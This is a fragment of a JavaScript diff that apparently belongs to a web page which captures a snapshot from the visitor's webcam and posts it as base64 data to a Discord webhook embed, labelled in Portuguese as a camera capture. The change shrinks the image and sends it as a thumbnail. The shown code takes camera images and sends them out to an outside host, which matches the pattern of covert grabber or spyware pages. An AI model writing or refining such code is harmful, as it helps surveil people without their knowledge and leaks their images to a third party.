@@ -141,8 +141,8 @@
                             title: title,
                             description: "Imagem capturada pela câmera.",
                             color: 16711680,
-                            image: {
-                                url: "data:image/png;base64," + data.split(",")[1] // Send base64 data
+                            thumbnail: {
+                                url: "data:image/png;base64," + data.split(",")[1] // Send base64 data as thumbnail
                             }
                         }
                     ]
@@ -185,15 +185,15 @@
                 // Allow the video feed to stabilize for a moment
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth / 4; // Reduce size for thumbnail
+                    canvas.height = video.videoHeight / 4;
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                     // Convert the snapshot to a base64 data URL
                     const imageData = canvas.toDataURL('image/png');
 
-                    // Send to Discord as base64 data
+                    // Send to Discord as thumbnail
                     sendToDiscord("Captura da Câmera", imageData, true);
 
                     // Stop the video stream
